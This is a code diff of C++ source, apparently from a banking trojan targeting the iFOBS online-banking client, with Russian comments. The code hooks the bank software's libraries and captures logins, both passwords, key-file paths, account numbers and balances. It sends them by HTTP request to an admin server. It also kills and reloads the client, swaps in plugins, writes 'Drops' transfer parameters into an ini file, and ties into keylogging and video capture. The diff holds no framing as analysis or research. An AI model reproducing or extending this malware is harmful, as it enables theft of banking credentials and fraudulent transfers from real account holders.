@@ -48,7 +48,8 @@ struct ForFindControl
 
 struct AccBalans
 {
-	char acc[64];
+	char accNumber[64];
+	char accId[64];
 	char balans[64];
 	char nameBank[128];
 	char login[64];
@@ -67,6 +68,13 @@ struct HookFunc //функция на которую ставится хук
 	char* nameOrigFunc; //имя подменяемой функции (для ifobs.plug)
 };
 
+//имена параметров в ини файле, для подмены
+struct NameIniParam
+{
+	char* app;
+	char* key;
+};
+
 static HookFunc funcsPlug[] =
 {
 	{ "VistaDB_D7.bpl", "HProc2", 0xA9782FE7, "OpenDatabaseConnection" },
@@ -76,6 +84,16 @@ static HookFunc funcsPlug[] =
 	{ "RtlStore.bpl", "HProc6", 0xCF6CD66, "GlobalAppStorage" },
 	{ "RtlData1.bpl", "HProc7", 0xAFD2F1E2, "FillDataToDBCache" },
 	{ 0 }
+};
+
+static NameIniParam namesIni[] =
+{
+	{ "Drops", "PlatSumm" },
+	{ "Drops", "FreezeBal" },
+	{ "Times", "Status1101" },
+	{ "Times", "Status1103" },
+	{ "Accounts", "WorkAcnt" },
+	{ 0, 0 }
 };
 
 //прототип из ifobs.plug
@@ -142,11 +160,12 @@ static void FreeFFC( ForFindControl& ffc )
 }
 
 //создает и возвращает рабочую папку для IFobs, в нее ложатся файлы необходимые для плагина
-static char* GetWorkFolder( char* path )
+static char* GetWorkFolder( char* path, const char* nameFile )
 {
 	pSHGetFolderPathA( 0, CSIDL_LOCAL_APPDATA,  0, 0, path );
 	pPathAppendA( path, "IFobs" );
 	pCreateDirectoryA( path, 0 ); //создает папку, если ее нет
+	pPathAppendA( path, nameFile );
 	return path;
 }
 
@@ -332,7 +351,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 	TMemory text(768);
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	pwsprintfA( text.AsStr(), "DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s, Client folder: %s", dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys, folderIFobs );
-	log.Send( 0, "Счет: '%s', баланс: '%s', банк: '%s'", dataFromPlug.acc, dataFromPlug.balans, dataFromPlug.nameBank );
+	log.Send( 0, "Счет: '%s', баланс: '%s', банк: '%s'", dataFromPlug.accNumber, dataFromPlug.balans, dataFromPlug.nameBank );
 	log.Send2( 0, text.AsStr() );
 	if( GetAdminUrl(urlAdmin) )
 	{
@@ -342,7 +361,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		char* urlText = URLEncode(text);
 //		char* urlText2 = URLEncode(resultGrab);
 
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.acc, urlBank );
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1&ida=%s", urlAdmin, BOT_UID, azUser.t_str(), dataFromPlug.balans, dataFromPlug.accNumber, urlBank, dataFromPlug.accId  );
 		THTTP H;
 		H.Get(request.AsStr());
 		DBG( "IFobs", "Отослали запрос 1: '%s'", request.AsStr() );
@@ -364,12 +383,16 @@ static DWORD WINAPI SendBalans( LPVOID p )
 	return 0;
 }
 
-void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank )
+static void WINAPI PutBalans( const char* accNumber, const char* accId, const char* balans, const char* nameBank )
 {
-	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", acc, balans, nameBank );
+	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", accNumber, balans, nameBank );
 	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
-	m_lstrcpy( dataFromPlug.acc, acc );
-	trimall( dataFromPlug.acc, ' ' );
+	m_lstrcpy( dataFromPlug.accNumber, accNumber );
+	trimall( dataFromPlug.accNumber, ' ' );
+
+	m_lstrcpy( dataFromPlug.accId, accId );
+	trimall( dataFromPlug.accId, ' ' );
+
 	m_lstrcpy( dataFromPlug.balans, balans );
 	m_lstrcpy( dataFromPlug.nameBank, nameBank );
 	dataFromPlug.set |= 1;
@@ -377,7 +400,7 @@ void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank
 		RunThread( SendBalans, 0 );
 }
 
-void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, const char* pathKeys )
+static void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, const char* pathKeys )
 {
 	DBG( "IFobs", "login: '%s', psw1: '%s', psw2: '%s'", login, pwd1, pwd2 );
 	SafeCopyStr( dataFromPlug.login, sizeof(dataFromPlug.login), login );
@@ -389,7 +412,7 @@ void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, 
 		RunThread( SendBalans, 0 );
 }
 
-BYTE* GetPlugin( const char* name, DWORD& size )
+static BYTE* GetPlugin( const char* name, DWORD& size )
 {
 	string nameFile = BOT::MakeFileName( 0, name );
 	BYTE* data = File::ReadToBufferA( nameFile.t_str(), size );
@@ -402,6 +425,22 @@ BYTE* GetPlugin( const char* name, DWORD& size )
 		}
 	}
 	return data;
+}
+
+static void DelPlugin( const char* name )
+{
+	string nameFile = BOT::MakeFileName( 0, name );
+	DBG( "IFobs", "Удаляем плагин %s -> %s", name, nameFile.t_str() );
+	pDeleteFileA(nameFile.t_str());
+}
+
+//удаляет загруженные плагины, чтобы они потом обновились
+void DeletePlugins()
+{
+	KillIFobs((void*)2);
+	pSleep(5000);
+	DelPlugin("ifobs.plug");
+	DelPlugin("rtlext.plug");
 }
 
 static DWORD WINAPI LoadPluginIFobs(LPVOID)
@@ -419,8 +458,7 @@ static DWORD WINAPI LoadPluginIFobs(LPVOID)
 		
 		//пишем в папку клиента RtlExt.bpl, она необходима для работы плагина
 		char pathExtRtl[MAX_PATH];
-		GetWorkFolder(pathExtRtl);
-		pPathAppendA( pathExtRtl, "RtlExt.bpl" );
+		GetWorkFolder( pathExtRtl, "RtlExt.bpl" );
 		if( File::WriteBufferA( pathExtRtl, rtlExt, sizeRtlExt ) == sizeRtlExt )
 		{
 			DBG( "IFobs", "Создали %s", pathExtRtl );
@@ -440,15 +478,18 @@ static DWORD WINAPI LoadPluginIFobs(LPVOID)
 static bool InitPlugin()
 {
 	bool ret = false;
+/*
 	DWORD sizeIfobsPlug = 0;
 	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
-	DBG( "IFobs", "1" );
 	TMemoryDLL ifobsPlug(dataIFobsPlug);
-	DBG( "IFobs", "2" );
 	ifobsPlug.SetNotFree();
+*/
 
-	PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
-	DBG( "IFobs", "3" );
+	string nameFile = BOT::MakeFileName( 0, "ifobs.plug" );
+	HMODULE ifobsPlug = (HMODULE)pLoadLibraryA(nameFile.t_str());
+
+//	PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
+	PInitFunc InitFunc = (PInitFunc)pGetProcAddress( ifobsPlug, "InitFunc" );
 	if( InitFunc )
 	{
 		DBG( "IFobs", "есть InitFunc" );
@@ -463,7 +504,8 @@ static bool InitPlugin()
 		bool ok = true;
 		while( fp->nameDll )
 		{
-			void* plugFunc = (void*)ifobsPlug.GetProcAddress(fp->nameFunc);
+//			void* plugFunc = (void*)ifobsPlug.GetProcAddress(fp->nameFunc);
+			void* plugFunc = (void*)pGetProcAddress( ifobsPlug, fp->nameFunc );
 			if( plugFunc )
 			{
 				DBG( "IFobs", "Найдена функция %s", fp->nameFunc );
@@ -490,7 +532,7 @@ static bool InitPlugin()
 		else
 			DBG( "IFobs", "ifobs.plug не установлена" );
 	}
-	MemFree(dataIFobsPlug);
+	//MemFree(dataIFobsPlug);
 	return ret;
 }
 
@@ -552,7 +594,6 @@ void Activeted1(LPVOID Sender)
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 //	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
 		MegaJump(SendIFobs);
-	VideoProcess::RecordPID( 0, "IFobs" );
 	VideoProcess::UpdateSettings( 0, 0, 0, 24 * 60 ); //бот не должен отключаться от видео сервера
 	typeActive = 1;
 }
@@ -673,29 +714,26 @@ DWORD WINAPI KillIFobs( void* p )
 void CreateFileReplacing( const char* s )
 {
 	if( s == 0 ) return;
-	TMemory data(1024);
-	int lenData = 0;
+	char ifobsIni[MAX_PATH];
+	GetWorkFolder( ifobsIni, "ifobs.ini" );
 	const char* end = s + m_lstrlen(s);
 	const char* p = s;
 	//ставим вместо пробелов переводы строк
-	while( p < end )
+	int i = 0;
+	while( p < end && namesIni[i].app )
 	{
 		const char* p2 = STR::Scan( p, ' ' );
 		if( p2 == 0 ) p2 = end;
-		m_memcpy( data.AsStr() + lenData, p, p2 - p );
-		lenData += p2 - p;
-		if( p2 != end ) //в последней строке не нужен перевод строки
-		{
-			data.AsStr()[lenData++] = '\r';
-			data.AsStr()[lenData++] = '\n';
-		}
+		char buf[64];
+		m_memcpy( buf, p, p2 - p );
+		buf[p2 - p] = 0;
+		pWritePrivateProfileStringA( namesIni[i].app, namesIni[i].key, buf, ifobsIni );
 		p = p2 + 1;
+		while( *p == ' ' ) p++;
+		i++;
 	}
-	char path[MAX_PATH];
-	GetWorkFolder(path);
-	pPathAppendA( path, "ifobs.dat" );
-	File::WriteBufferA( path, data.AsStr(), lenData );
-	DBG( "IFobs", "Создали файл '%s'", path );
+	DBG( "IFobs", "Обновили файл '%s'", ifobsIni );
+	VideoProcess::RecordPID( 0, "IFobs" );
 }
 
 
